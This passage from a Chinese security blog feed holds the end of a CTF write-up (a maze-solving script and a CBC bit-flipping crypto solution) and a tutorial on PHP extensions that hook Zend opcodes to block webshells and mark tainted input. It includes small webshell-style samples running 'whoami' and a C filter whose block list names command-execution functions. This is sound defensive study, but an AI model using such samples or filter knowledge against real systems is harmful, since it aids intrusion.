i <span class="keyword">in</span> range(length):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(width):</span><br><span class="line">   k = i*width+j</span><br><span class="line">   <span class="keyword">if</span> k&gt;len(style):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">   walls = style[k]</span><br><span class="line">   <span class="keyword">if</span> <span class="string">u'border-top'</span> <span class="keyword">in</span> walls:</span><br><span class="line">    maze[i][j][<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> <span class="string">u'border-right'</span> <span class="keyword">in</span> walls:</span><br><span class="line">    maze[i][j][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> <span class="string">u'border-bottom'</span> <span class="keyword">in</span> walls:</span><br><span class="line">    maze[i][j][<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">if</span> <span class="string">u'border-left'</span> <span class="keyword">in</span> walls:</span><br><span class="line">    maze[i][j][<span class="number">3</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># print maze</span></span><br><span class="line"> dfs(<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">print</span> mlength</span><br><span class="line"> <span class="keyword">print</span> mnode</span><br><span class="line"> <span class="comment"># print visited</span></span><br><span class="line"> visited = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(width)]<span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line"> dfs(mnode[<span class="number">0</span>],mnode[<span class="number">1</span>],<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">print</span> mlength</span><br><span class="line"> <span class="keyword">print</span> mnode</span><br></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>打开发现AES加密有两个条件语句 一个是msg的判断一个code的判断。发现需要对msg做CBC字节翻转，翻转后得到</p><p>706c656173652073656e64206d6520796f757220666c616700000000000000003b1c5a0d0f0658502b6124xxxxxxxxxxx</p><p>然后nc输入code即可</p><p><img src="https://img.5am3.com/20190624156134945857803.png" alt="20190624156134945857803.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;感谢Syclover师傅们的题目。&lt;br&gt;比赛体验良好，最终国内第五名。&lt;br&gt;以下为我们的WP。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://kctf.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://kctf.github.io/tags/CTF/"/>
    
      <category term="WriteUp" scheme="http://kctf.github.io/tags/WriteUp/"/>
    
      <category term="SCTF2019" scheme="http://kctf.github.io/tags/SCTF2019/"/>
    
  </entry>
  
  <entry>
    <title>初探php拓展层面</title>
    <link href="http://kctf.github.io/2019/03/03/php-extension-1/"/>
    <id>http://kctf.github.io/2019/03/03/php-extension-1/</id>
    <published>2019-03-03T13:27:55.000Z</published>
    <updated>2019-06-18T09:22:56.874Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发先知社区，文章链接：<a href="https://xz.aliyun.com/t/4214" target="_blank" rel="noopener">https://xz.aliyun.com/t/4214</a></p></blockquote><p>前段时间想写一个静态代码审计工具,需要对php扩展熟悉一些,那么自己从零开始接触这一块,如果有错误的地方,麻烦师傅们指正。</p><p>另外呢网上虽然有一些文章,但是感觉都不是特别细,对于刚入门的我来说有些难以理解,因此详细的记录下自己的学习过程。</p><a id="more"></a><p>我在mac环境上折腾了两天gdb,还是没折腾好,无奈选择docker,这里推荐一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hxer/php-debug/blob/master/Dockerfile</span><br></pre></td></tr></table></figure><p>这个dockerfile的vld和php版本不匹配,需要更换下低版本的vld。</p><p>启动命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -d --security-opt seccomp=unconfined -v /Users/p0desta/Desktop/code:/home php5-debug</span><br></pre></td></tr></table></figure><h4 id="编写最简单的php扩展"><a href="#编写最简单的php扩展" class="headerlink" title="编写最简单的php扩展"></a>编写最简单的php扩展</h4><ul><li><p>在ext目录下执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=p0desta</span><br></pre></td></tr></table></figure></li><li><p>然后进入到扩展目录下,编辑config.m4文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">16 dnl PHP_ARG_ENABLE(foobar, whether to enable foobar support,</span><br><span class="line">17 dnl Make sure that the comment is aligned:</span><br><span class="line">18 dnl [  --enable-foobar           Enable foobar support])</span><br></pre></td></tr></table></figure></li><li><p>删除第16-18行的注释</p></li><li><p>然后去php_p0desta.h文件,添加函数声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line">PHP_FUNCTION(p0desta);</span><br></pre></td></tr></table></figure></li><li><p>然后到p0desta.c中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const zend_function_entry p0desta_functions[] = &#123;</span><br><span class="line">PHP_FE(p0desta, NULL)</span><br><span class="line">PHP_FE(confirm_p0desta_compiled,NULL)/* For testing, remove later. */</span><br><span class="line">PHP_FE_END/* Must be the last line in p0desta_functions[] */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>添加如下<code>PHP_FE(p0desta, NULL)</code></p></li><li><p>然后到最底下编写函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(p0desta)</span><br><span class="line">&#123;</span><br><span class="line">php_printf(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后在当前目录下执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure --enable-p0desta --enable-debug</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li></ul><p>然后会在modules文件夹下生存<code>so</code>文件,在php.ini中添加拓展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=p0desta.so</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153079741-4c7090fd-cd68-4345-b79b-6494ee37879a.png#align=left&display=inline&height=430&originHeight=430&originWidth=720&size=0&status=done&width=720" alt></p><p>然后就可以调用自写的函数。</p><h4 id="php代码的大致执行流程"><a href="#php代码的大致执行流程" class="headerlink" title="php代码的大致执行流程"></a>php代码的大致执行流程</h4><p>开始 -&gt; Scanning,将php代码转换为语言片段(Tokens) -&gt; Parsing,将tokens转化为简单而有意义的表达式 -&gt; Compilation,将表达式编译成opcode -&gt; Execution,顺次执行opcodes,从而实现php脚本的功能。</p><h4 id="hook最简单的opcode"><a href="#hook最简单的opcode" class="headerlink" title="hook最简单的opcode"></a>hook最简单的opcode</h4><p>关于一些宏的解释参考:<code>https://github.com/pangudashu/php7-internal/blob/master/7/hook.md</code></p><p>这里我使用<code>zend_set_user_opcode_handler</code>函数来hook <code>echo</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_set_user_opcode_handler(ZEND_ECHO, ppecho);</span><br></pre></td></tr></table></figure><p>主要原理是将对应的Zend op的handler函数替换成我们自己定义的来实现HOOK</p><p>首先我在扩展.h中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_OPCODE_HANDLER_ARGS void</span></span><br><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ppecho</span><span class="params">(ZEND_OPCODE_HANDLER_ARGS)</span></span>;</span><br></pre></td></tr></table></figure><p>扩展.c中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(p_echo)</span><br><span class="line">&#123;</span><br><span class="line">/* If you have INI entries, uncomment these lines</span><br><span class="line">REGISTER_INI_ENTRIES();</span><br><span class="line">*/</span><br><span class="line">zend_set_user_opcode_handler(ZEND_ECHO, ppecho);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int ppecho(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">php_printf(&quot;hook success&quot;);</span><br><span class="line">return ZEND_USER_OPCODE_RETURN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果打算放行继续执行的话<code>return ZEND_USER_OPCODE_DISPATCH</code>,如果不继续执行的话<code>return ZEND_USER_OPCODE_RETURN</code></p><p>编译完之后看一下效果</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153079547-3db86644-1931-473b-a9ac-a49e54bad890.png#align=left&display=inline&height=400&originHeight=400&originWidth=1056&size=0&status=done&width=1056" alt></p><h4 id="Webshell简单防御初探"><a href="#Webshell简单防御初探" class="headerlink" title="Webshell简单防御初探"></a>Webshell简单防御初探</h4><p>关于一些PHP内核中的定义详情请参考<code>https://www.kancloud.cn/kancloud/php-internals/42755</code></p><p>这里我们暂时需要了解的有</p><ul><li><p>全局变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EG()、这个宏可以用来访问符号表，函数，资源信息和常量</span><br><span class="line">CG() 用来访问核心全局变量</span><br><span class="line">PG() PHP全局变量。我们知道php.ini会映射一个或者多个PHP全局结构。举几个使用这个宏的例子：PG(register_globals), PG(safe_mode), PG(memory_limit)</span><br><span class="line">FG() 文件全局变量。大多数文件I/O或相关的全局变量的数据流都塞进标准扩展出口结构。</span><br></pre></td></tr></table></figure></li><li><p>函数类型<br>Zend引擎将函数分为以下几个类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define ZEND_INTERNAL_FUNCTION 1</span><br><span class="line">#define ZEND_USER_FUNCTION 2 </span><br><span class="line">#define ZEND_OVERLOADED_FUNCTION 3</span><br><span class="line">#define ZEND_EVAL_CODE 4</span><br><span class="line">#define ZEND_OVERLOADED_FUNCTION_TEMPORARY 5</span><br></pre></td></tr></table></figure><ul><li><p>ZEND_USER_FUNCTION （用户函数:用户定义的函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ZEND_INTERNAL_FUNCTION (内部函数:由扩展、PHP内核、Zend引擎提供的内部函数)</p></li><li><p>变量函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="string">'print_r'</span>;</span><br><span class="line">$func(<span class="string">'i am print_r function.'</span>);</span><br></pre></td></tr></table></figure></li><li><p>匿名函数</p></li></ul></li><li><p>php7的_zend_execute_data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">zval                *return_value;</span><br><span class="line">zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">zend_execute_data   *prev_execute_data;</span><br><span class="line">zend_array          *symbol_table;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_RUN_TIME_CACHE</span></span><br><span class="line"><span class="keyword">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_LITERALS</span></span><br><span class="line">zval                *literals;         <span class="comment">/* cache op_array-&gt;literals       */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p>我们看一下如下代码的opcode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"system('whoami');"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153079571-a4ab6121-bf21-4d74-9c35-f37c9ed57a11.png#align=left&display=inline&height=1618&originHeight=1618&originWidth=2736&size=0&status=done&width=2736" alt></p><p>我们hook掉<code>INCLUDE_OR_EVAL</code></p><p>修改<code>php_hook_eval.h</code>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line">static int HOOK_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS);</span><br><span class="line"># define ZEND_OPCODE_HANDLER_ARGS zend_execute_data *execute_data</span><br></pre></td></tr></table></figure><p>修改<code>hook_eval.c</code>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static int HOOK_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">zend_execute_data *tmp = &amp;execute_data;</span><br><span class="line">zend_op *opline = execute_data-&gt;opline;</span><br><span class="line">return ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在<code>execute_data</code>中往下找调用的函数<code>system</code></p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153079797-5582aae3-35f1-47f0-847d-7317e81ff6f2.png#align=left&display=inline&height=568&originHeight=568&originWidth=2878&size=0&status=done&width=2878" alt></p><p>这个也就是操作数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string型变量比较特殊，因为内核在保存String型变量时，不仅保存了字符串的值，还保存了它的长度，所以它有对应的两种宏组合STRVAL和STRLEN，即：Z_STRVAL、Z_STRVAL_P、Z_STRVAL_PP与Z_STRLEN、Z_STRLEN_P、Z_STRLEN_PP。</span><br></pre></td></tr></table></figure><p>编写<code>HOOK_INCLUDE_OR_EVAL</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static int HOOK_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">zend_op *opline = execute_data-&gt;opline;</span><br><span class="line">zval *operands = opline-&gt;op1.zv;</span><br><span class="line">char *cmd = Z_STRVAL_P(operands);</span><br><span class="line">if(cmd)&#123;</span><br><span class="line">if((strstr(cmd, &quot;system&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;exec&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;shell_exec&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;passthru&quot;)==NULL)&amp;&amp;(strstr(cmd, &quot;roc_open&quot;)==NULL))&#123;</span><br><span class="line">return ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> return ZEND_USER_OPCODE_RETURN;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return ZEND_USER_OPCODE_DISPATCH; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下执行流程</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153079566-e711a7e4-2981-44cb-ab38-21fd9eee72e2.png#align=left&display=inline&height=496&originHeight=496&originWidth=2878&size=0&status=done&width=2878" alt></p><p>当然,只hook掉<code>ZEND_INCLUDE_OR_EVAL</code>是很难防御的,比如说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&apos;echo `whoami`;&apos;);</span><br></pre></td></tr></table></figure><p>这种就必须再去hook <code>DO_FCALL</code></p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153079577-f8d0e0e9-633f-479b-907b-9153a770eb8a.png#align=left&display=inline&height=1622&originHeight=1622&originWidth=2680&size=0&status=done&width=2680" alt></p><p>为了不影响业务并且去做更好的防御,还需要更深入的研究。</p><p>参考:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://drops.xmd5.com/static/drops/web-7333.html</span><br><span class="line">https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html</span><br></pre></td></tr></table></figure><p>这篇我讲继续学习污点标记以及标记打在何处,学习过程我会通过阅读<code>http://pecl.php.net/package/taint</code>的源码来详述实现原理和一些细节。</p><p>下一篇讲会对污点跟踪进行分析。</p><h4 id="污点标记"><a href="#污点标记" class="headerlink" title="污点标记"></a>污点标记</h4><p>这里我们认为所有传入的数据都是不可信的,也就是说所有通过请求发送过来的数据都需要打上标记,被打上标记的数据是会传播的,比如说当进行字符串的拼接等操作在结束后要对新的数据从新标记,因为这个新的字符串仍然是不可信数据,但是经过一些处理函数,比如说<code>addslashes</code>这类函数,就可以将标记清除掉。</p><h5 id="标记点"><a href="#标记点" class="headerlink" title="标记点"></a>标记点</h5><p>首先我们需要知道怎么打标记,将标记打在何处</p><p>首先php7和php5的变量结构体是不一样的,因为结构体的不同,标记打在何处也就产生了区别</p><ul><li><p>php7</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="keyword">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="keyword">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> w1;</span><br><span class="line"><span class="keyword">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_refcounted_h</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span>         refcount;<span class="comment">/* reference counter 32-bit */</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,</span><br><span class="line">zend_uchar    flags,    <span class="comment">/* used for strings &amp; objects */</span></span><br><span class="line"><span class="keyword">uint16_t</span>      gc_info)  <span class="comment">/* keeps GC root number (or 0) and color */</span></span><br><span class="line">&#125; v;</span><br><span class="line"><span class="keyword">uint32_t</span> type_info;</span><br><span class="line">&#125; u;</span><br><span class="line">&#125; zend_refcounted_h;</span><br></pre></td></tr></table></figure></li><li><p>在taint中,对于php7来说污染标记的原理是利用<code>zend_uchar flags</code>变量回收结构中未被使用的标记为去做污染标记,如果随着版本的升级,这个位被使用后,那么就会产生冲突。</p></li><li><p>php5</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zvalue_value &#123;</span><br><span class="line"><span class="keyword">long</span> lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="keyword">double</span> dval;<span class="comment">/* double value */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> *val;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line">&#125; str;</span><br><span class="line">HashTable *ht;<span class="comment">/* hash table value */</span></span><br><span class="line">zend_object_value obj;</span><br><span class="line">zend_ast *ast;</span><br><span class="line">&#125; zvalue_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* Variable information */</span></span><br><span class="line">zvalue_value value;<span class="comment">/* value */</span></span><br><span class="line">zend_uint refcount__gc;</span><br><span class="line">zend_uchar type;<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar is_ref__gc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>可以看到这个版本的字段并不多,没有方便我们做标记的位置。<br>看下taint中是如何实现的吧。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Z_STRVAL_PP(ppzval) = erealloc(Z_STRVAL_PP(ppzval), Z_STRLEN_PP(ppzval) + 1 + PHP_TAINT_MAGIC_LENGTH);</span><br><span class="line">PHP_TAINT_MARK(*ppzval, PHP_TAINT_MAGIC_POSSIBLE);</span><br></pre></td></tr></table></figure><p>看的宏的定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define PHP_TAINT_MAGIC_NONE     0x00000000</span><br><span class="line">#define PHP_TAINT_MAGIC_POSSIBLE 0x6A8FCE84</span><br><span class="line">#define PHP_TAINT_MAGIC_UNTAINT  0x2C5E7F2D</span><br><span class="line"></span><br><span class="line">#define PHP_TAINT_MARK(zv, mark) *((unsigned *)(Z_STRVAL_P(zv) + Z_STRLEN_P(zv) + 1)) = (mark)</span><br><span class="line">#define PHP_TAINT_POSSIBLE(zv) (*(unsigned *)(Z_STRVAL_P(zv) + Z_STRLEN_P(zv) + 1) == PHP_TAINT_MAGIC_POSSIBLE)</span><br><span class="line">#define PHP_TAINT_UNTAINT(zv)  (*(unsigned *)(Z_STRVAL_P(zv) + Z_STRLEN_P(zv) + 1) == PHP_TAINT_MAGIC_UNTAINT)</span><br></pre></td></tr></table></figure><p>可能这样看不是很直观,直接看图</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153113125-d2313878-e53c-455b-a82c-667b41d2ce6b.png#align=left&display=inline&height=1234&originHeight=1234&originWidth=2282&size=0&status=done&width=2282" alt></p><p>既然这样,那么当想要消除标记的时候直接再将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define PHP_TAINT_MAGIC_NONE     0x00000000</span><br></pre></td></tr></table></figure><p>打上即可。</p><h5 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h5><p>上面我们认为所有的请求都是不可信的,再没有经过安全函数时都要打上标记,接下来看下获取http请求参数以及给参数打上标记。</p><p>获取http请求参数,看鸟哥的文章<code>http://www.laruence.com/2008/04/04/17.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define TRACK_VARS_POST           0</span><br><span class="line">#define TRACK_VARS_GET            1</span><br><span class="line">#define TRACK_VARS_COOKIE         2</span><br><span class="line">#define TRACK_VARS_SERVER         3</span><br><span class="line">#define TRACK_VARS_ENV            4</span><br><span class="line">#define TRACK_VARS_FILES          5</span><br><span class="line">#define TRACK_VARS_REQUEST        6</span><br></pre></td></tr></table></figure><p>鸟哥问中提到<code>根据测试的结果，可以认定PG(http_globals)[TRACK_VARS_GET]是一个hash table;</code></p><p>我们先利用一下代码获取一下请求参数看一下,这里为了简单分析,直接修改上篇文章HOOK_INCLUDE_OR_EVAL来分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashTable *ht;</span><br><span class="line">zval *arr;</span><br><span class="line">arr = PG(http_globals)[TRACK_VARS_GET];</span><br><span class="line">ht = HASH_OF(arr);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153113137-d266e5e5-cf6a-4e0f-9ece-9f861d69e788.png#align=left&display=inline&height=944&originHeight=944&originWidth=2862&size=0&status=done&width=2862" alt></p><p>可以看到是可以直接从这个hashtable里面获取到我们的参数的</p><p>可以利用相关的宏方便获取的,在zend_hash.h里面可以找到相关的宏</p><p>将hashtable中的数据全都遍历出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">HOOK_INCLUDE_OR_EVAL</span><span class="params">(ZEND_OPCODE_HANDLER_ARGS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ulong 